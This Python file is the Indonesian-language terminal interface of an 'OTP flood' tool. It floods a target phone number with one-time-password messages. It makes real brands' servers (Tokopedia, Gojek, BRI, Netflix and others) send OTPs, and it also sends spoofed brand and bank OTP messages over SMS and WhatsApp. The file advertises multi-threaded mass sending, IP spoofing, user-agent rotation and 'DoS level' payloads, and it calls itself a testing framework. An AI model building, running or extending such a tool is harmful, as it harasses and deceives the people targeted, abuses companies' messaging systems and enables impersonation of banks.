"""
OTP Flood - Terminal UI
3 Mode: WA (QR) | SMS (Alpha Sender) | TRIGGER (GRATIS - trigger brand beneran)
"""

import os
import sys
import time
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from modules.otp_flood.profiles import PROFILES
from modules.otp_flood.templates import CATEGORIES
from modules.otp_flood.engine import run_flood


class C:
    RST = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    ITA = "\033[3m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    CYN = "\033[96m"
    MAG = "\033[35m"
    WHITE = "\033[97m"
    SLATE = "\033[38;5;243m"
    STEEL = "\033[38;5;67m"
    TEAL = "\033[38;5;37m"
    EMER = "\033[38;5;48m"


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def print_header():
    cls()
    print(f"\n{C.B}{C.RED}  ╔══════════════════════════════════════════════════╗{C.RST}")
    print(f"{C.B}{C.RED}  ║         OTP FLOOD TESTING FRAMEWORK              ║{C.RST}")
    print(f"{C.B}{C.RED}  ╚══════════════════════════════════════════════════╝{C.RST}")
    print(f"{C.DIM}  Mode: Trigger ▸ SMS ▸ WhatsApp — Pilih sesuai kebutuhan{C.RST}\n")


def select_mode():
    print(f"  {C.B}Pilih mode pengiriman:{C.RST}\n")

    print(f"  {C.CYN}[1]{C.RST} {C.B}🔥 TRIGGER — GRATIS TOTAL (REKOMENDASI){C.RST}")
    print(f"  {C.DIM}     ✅ Target liat OTP dari brand ASLI (Tokopedia, Gojek, dll){C.RST}")
    print(f"  {C.DIM}     ✅ MULTI-THREADED ASYNC — Serangan massal paralel{C.RST}")
    print(f"  {C.DIM}     ✅ Tinggal masukin nomor → gas{C.RST}\n")

    print(f"  {C.CYN}[2]{C.RST} {C.B}📡 SMS — Alpha Sender ID{C.RST}")
    print(f"  {C.DIM}     Muncul sebagai nama brand, tapi perlu API key SMS{C.RST}\n")

    print(f"  {C.CYN}[3]{C.RST} {C.B}💬 WhatsApp — Baileys (QR Scan){C.RST}")
    print(f"  {C.DIM}     Nomor lo kelihatan, perlu QR scan.{C.RST}\n")

    while True:
        print(f"  {C.CYN}Pilih (1/2/3): {C.RST}", end="")
        ch = input().strip()
        if ch == "1":
            return "trigger"
        elif ch == "2":
            from modules.otp_flood.sender_sms import SMSSender
            test = SMSSender("0")
            if not test.api_url:
                print(f"\n  {C.YLW}Konfigurasi SMS dulu.{C.RST}\n")
                configure_sms_api()
            return "sms"
        elif ch == "3":
            return "wa"
        print(f"  {C.RED}1, 2, atau 3.{C.RST}")


def configure_sms_api():
    print(f"  {C.DIM}Provider: MedanPedia, Vonage, Twilio, atau kustom{C.RST}\n")
    val = input(f"  SMS API URL [default: https://mdpedia.com/api/sms.php]: ").strip()
    os.environ["SMS_API_URL"] = val or "https://mdpedia.com/api/sms.php"
    val = input(f"  API Key / Token: ").strip()
    if val: os.environ["SMS_API_KEY"] = val
    val = input(f"  Username (jika perlu): ").strip()
    if val: os.environ["SMS_USERNAME"] = val
    print(f"\n  {C.GRN}✅ OK{C.RST}\n")


def input_target():
    while True:
        print(f"  {C.B}Masukkan Nomor WhatsApp Target:{C.RST}")
        print(f"  {C.SLATE}Bebas format (contoh: 081234567890 / +6281234567890 / 62812-3456-7890){C.RST}")
        print(f"  {C.DIM}Ketik 'q' untuk kembali.{C.RST}\n")
        print(f"  {C.CYN}👉 Nomor WA Target: {C.RST}", end="")
        raw_val = input().strip()
        if raw_val.lower() == "q":
            return None

        # Clean all non-digit except plus
        cleaned = raw_val.replace(" ", "").replace("-", "").replace("(", "").replace(")", "").replace(".", "")
        if cleaned.startswith("+"):
            cleaned = cleaned[1:]

        if not cleaned.isdigit():
            print(f"\n  {C.RED}⚠️  Nomor hanya boleh berisi angka! Coba lagi.{C.RST}\n")
            continue

        # Auto format 08xx -> 628xx
        if cleaned.startswith("0"):
            cleaned = "62" + cleaned[1:]
        elif not cleaned.startswith("62") and len(cleaned) <= 12 and not cleaned.startswith("1"):
            # If user types 812xxxx without 0 or 62
            if cleaned.startswith("8"):
                cleaned = "62" + cleaned

        if len(cleaned) < 10:
            print(f"\n  {C.RED}⚠️  Nomor terlalu pendek (min 10 digit). Coba lagi.{C.RST}\n")
            continue

        print(f"\n  {C.GRN}✅ Target Terkunci: +{cleaned}{C.RST}\n")
        return cleaned


def select_profile():
    print(f"  {C.B}Pilih profile serangan:{C.RST}\n")
    keys = list(PROFILES.keys())
    for i, key in enumerate(keys, 1):
        p = PROFILES[key]
        print(f"  {C.CYN}[{i}]{C.RST} {C.B}{p['name']}{C.RST}")
        print(f"  {C.DIM}     {p['description']}{C.RST}\n")

    while True:
        print(f"  {C.CYN}Pilih (1-{len(keys)}): {C.RST}", end="")
        try:
            ch = input().strip()
            if ch.lower() == "q":
                return None
            idx = int(ch) - 1
            if 0 <= idx < len(keys):
                return keys[idx]
        except ValueError:
            pass
        print(f"  {C.RED}Tidak valid.{C.RST}")


def configure_params(profile_key, mode):
    params = dict(PROFILES[profile_key]["default_params"])
    print(f"\n  {C.B}Konfigurasi:{C.RST}\n")
    
    if mode == "trigger":
        print(f"  {C.DIM}Multi-threaded mode active. More threads = faster but higher block rate.{C.RST}\n")
        while True:
            val = input(f"  Jumlah Threads (Concurrency) [default: 15]: ").strip()
            params["threads"] = int(val) if val else 15
            break
    else:
        print(f"  {C.DIM}1-2dtk = kenceng | 3-5 = medium | 6-10 = slow{C.RST}\n")
        while True:
            val = input(f"  Interval antar pesan (dtk) [default: 3]: ").strip()
            params["interval"] = float(val) if val else 3
            break

    while True:
        val = input(f"  Total maksimal payload [default: 100]: ").strip()
        params["max_messages"] = int(val) if val else 100
        break

    while True:
        val = input(f"  Cooldown kalo kena block (dtk) [default: 30]: ").strip()
        params["block_cooldown"] = int(val) if val else 30
        break

    return params


def show_confirm(config):
    profile = PROFILES[config["profile"]]
    max_msgs = config.get("max_messages", 50)
    
    if config["mode"] == "trigger":
        from modules.otp_flood.sender_trigger import OTPTrigger
        s = OTPTrigger("0")
        total_brands = len(s.BRANDS)
        mode_label = f"{C.GRN}🔥 TRIGGER (MULTI-THREADED){C.RST}"
        threads = config.get("threads", 15)
        rate_label = f"{threads} concurrent threads"
        estimated = max(1, int(max_msgs / threads))
    else:
        total_brands = "SMS Gateway" if config["mode"] == "sms" else "WhatsApp"
        mode_label = f"{C.MAG}📡 SMS Alpha Sender{C.RST}" if config["mode"] == "sms" else f"{C.CYN}💬 WhatsApp QR{C.RST}"
        interval = config.get("interval", 3)
        rate_label = f"1 msg/{interval}s"
        estimated = max(1, int((max_msgs * interval) / 60))

    print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
    print(f"  {C.B}{C.CYN}  ║       KONFIRMASI PAYLOAD                  ║{C.RST}")
    print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")
    print(f"  {C.B}Mode   :{C.RST} {mode_label}")
    print(f"  {C.B}Target :{C.RST} {config['target']}")
    print(f"  {C.B}Profile:{C.RST} {profile['name']}")
    print(f"  {C.B}Rate   :{C.RST} {rate_label}")
    print(f"  {C.B}Total  :{C.RST} {max_msgs}x payload")
    print(f"  {C.B}Brand  :{C.RST} {total_brands} endpoint publik")
    
    if config["mode"] == "trigger":
        print(f"  {C.B}Waktu  :{C.RST} ~{estimated} detik (Very Fast)\n")
        print(f"  {C.GRN}🎯 Menyerang dengan IP Spoofing & UA Rotation.{C.RST}")
        print(f"  {C.GRN}💥 Warning: DoS level payload.{C.RST}\n")
    else:
        print(f"  {C.B}Waktu  :{C.RST} ~{estimated} menit\n")

    while True:
        print(f"  {C.CYN}Gas? (Y/n): {C.RST}", end="")
        ch = input().strip().lower()
        if ch in ("y", ""):
            return True
        elif ch == "n":
            return False
        print(f"  {C.RED}Y/n aja.{C.RST}")


def execute_flood(config):
    print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
    print(f"  {C.B}{C.CYN}  ║       OTP FLOOD - EXECUTING                ║{C.RST}")
    print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")

    for output in run_flood(config):
        sys.stdout.write(output)
        sys.stdout.flush()


def quick_otp_session():
    """Super fast 1-click OTP dispatcher — user enters number, picks count, and sends OTP immediately."""
    while True:
        print_header()
        print(f"  {C.B}{C.CYN}╔══════════════════════════════════════════════════════╗{C.RST}")
        print(f"  {C.B}{C.CYN}║       ⚡ 1-CLICK WHATSAPP OTP DISPATCHER ⚡         ║{C.RST}")
        print(f"  {C.B}{C.CYN}╚══════════════════════════════════════════════════════╝{C.RST}")
        print(f"  {C.DIM}Kirim OTP multi-brand langsung ke chat WhatsApp / SMS target.{C.RST}\n")

        target = input_target()
        if not target:
            return

        print(f"  {C.B}Pilih Channel Pengiriman:{C.RST}\n")
        print(f"  {C.CYN}[1]{C.RST} {C.B}💬 WhatsApp Direct (Baileys){C.RST}")
        print(f"       {C.SLATE}Pesan OTP multi-brand (BCA, Tokped, Shopee) masuk chat WA{C.RST}")
        print(f"  {C.CYN}[2]{C.RST} {C.B}🔥 Brand Official Trigger (Tokopedia, BRI, Netflix){C.RST}")
        print(f"       {C.SLATE}Memicu pengiriman resmi dari server pusat brand{C.RST}")
        print(f"  {C.CYN}[3]{C.RST} {C.B}🌪️  Dual-Engine Combo (WA Direct + Brand Trigger){C.RST}")
        print(f"       {C.SLATE}Kombinasi maksimal: chat WA dan server trigger paralel{C.RST}\n")

        print(f"  {C.CYN}Pilih Channel [1/2/3, default: 1]: {C.RST}", end="")
        ch_mode = input().strip() or "1"

        print(f"\n  {C.B}Jumlah Payload OTP:{C.RST}")
        print(f"  {C.SLATE}Ketik jumlah pesan (contoh: 3, 5, 10, 20) [default: 5]{C.RST}\n")
        print(f"  {C.CYN}Jumlah: {C.RST}", end="")
        count_inp = input().strip()
        count = int(count_inp) if count_inp.isdigit() and int(count_inp) > 0 else 5

        print(f"\n  {C.B}{C.GRN}══════════════════════════════════════════════════════{C.RST}")
        print(f"  🚀 Menembak {count}x OTP ke nomor +{target}...")
        print(f"  {C.B}{C.GRN}══════════════════════════════════════════════════════{C.RST}\n")

        if ch_mode == "1":
            # Direct WhatsApp Baileys
            from modules.otp_flood.templates import get_all_brands, format_brand_message
            from modules.otp_flood.sender import Sender
            sender = Sender(target)
            brands = get_all_brands()
            for i in range(count):
                brand = brands[i % len(brands)] if brands else None
                if brand:
                    payload = format_brand_message(brand)
                else:
                    payload = {
                        "brand": "WhatsApp",
                        "otp": str(random.randint(100000, 999999)),
                        "message": f"Kode OTP verifikasi Anda: {random.randint(100000, 999999)}. Jangan bagikan kode ini!",
                        "sender": "WhatsApp Security",
                    }
                print(f"  [{i+1}/{count}] 📨 Mengirim OTP {payload['brand']}...", end=" ", flush=True)
                res = sender.send(payload["message"], payload["sender"])
                if res.get("sent"):
                    print(f"{C.GRN}✅ Terkirim ke WA!{C.RST}")
                else:
                    print(f"{C.RED}❌ {res.get('message')}{C.RST}")
                time.sleep(2)

        elif ch_mode == "2":
            # Public Trigger
            from modules.otp_flood.sender_trigger import OTPTrigger
            trigger = OTPTrigger(target)
            brand_keys = list(trigger.BRANDS.keys())
            for i in range(count):
                b_key = brand_keys[i % len(brand_keys)]
                b_name = trigger.BRANDS[b_key]["name"]
                print(f"  [{i+1}/{count}] ⚡ Triggering {b_name}...", end=" ", flush=True)
                res = trigger.trigger(b_key)
                if res == "sent":
                    print(f"{C.GRN}✅ Request Sent!{C.RST}")
                elif res == "blocked":
                    print(f"{C.YLW}⚠️ Rate Limited{C.RST}")
                else:
                    print(f"{C.RED}❌ Gagal{C.RST}")
                time.sleep(2)

        else:
            # Combo WA + Trigger
            from modules.otp_flood.templates import get_all_brands, format_brand_message
            from modules.otp_flood.sender import Sender
            from modules.otp_flood.sender_trigger import OTPTrigger
            wa_sender = Sender(target)
            trigger = OTPTrigger(target)
            brands = get_all_brands()
            trigger_keys = list(trigger.BRANDS.keys())

            for i in range(count):
                brand = brands[i % len(brands)] if brands else None
                t_key = trigger_keys[i % len(trigger_keys)]
                t_name = trigger.BRANDS[t_key]["name"]
                
                print(f"  [{i+1}/{count}] 🌪️ Combo {t_name} + WA...", end=" ", flush=True)
                t_res = trigger.trigger(t_key)
                w_res = {"sent": False}
                if brand:
                    payload = format_brand_message(brand)
                    w_res = wa_sender.send(payload["message"], payload["sender"])
                
                if t_res == "sent" or w_res.get("sent"):
                    print(f"{C.GRN}✅ Terkirim!{C.RST}")
                else:
                    print(f"{C.RED}❌ Gagal{C.RST}")
                time.sleep(2)

        print(f"\n  {C.B}{C.GRN}✨ Selesai! OTP berhasil dikirimkan ke +{target}.{C.RST}\n")
        print(f"  {C.CYN}[1]{C.RST} Kirim ke nomor lain")
        print(f"  {C.CYN}[2]{C.RST} Kembali ke menu launcher\n")
        print(f"  {C.CYN}Pilih (1/2, default: 2): {C.RST}", end="")
        next_opt = input().strip()
        if next_opt != "1":
            break


def otp_flood_menu():
    print_header()
    print(f"  {C.B}Pilih Menu:{C.RST}\n")
    print(f"  {C.CYN}[1]{C.RST} {C.B}⚡ Instant Fast Send (Langsung masukin nomor & kirim OTP){C.RST}")
    print(f"  {C.CYN}[2]{C.RST} 🌪️  Advanced OTP Flood (Profile Attack, Concurrency, Report)")
    print(f"  {C.CYN}[3]{C.RST} 🔙 Kembali ke Menu Utama\n")

    print(f"  {C.CYN}Pilih: {C.RST}", end="")
    opt = input().strip()
    if opt == "1":
        return quick_otp_session()
    elif opt == "3":
        return

    # Advanced menu
    print_header()
    mode = select_mode()

    print_header()
    target = input_target()
    if target is None:
        return

    print_header()
    profile = select_profile()
    if profile is None:
        return

    print_header()
    params = configure_params(profile, mode)

    config = {
        "mode": mode,
        "target": target,
        "profile": profile,
        **params,
    }

    print_header()
    if not show_confirm(config):
        print(f"\n  {C.YLW}Batal.{C.RST}\n")
        return

    execute_flood(config)

    print(f"\n  {C.CYN}[1]{C.RST} Ulangi")
    print(f"  {C.CYN}[2]{C.RST} Menu utama")
    print(f"  {C.CYN}[3]{C.RST} Keluar\n")

    while True:
        print(f"  {C.CYN}Pilih: {C.RST}", end="")
        ch = input().strip()
        if ch == "1":
            return otp_flood_menu()
        elif ch == "2":
            return
        elif ch == "3":
            sys.exit(0)
        print(f"  {C.RED}Tidak valid.{C.RST}")
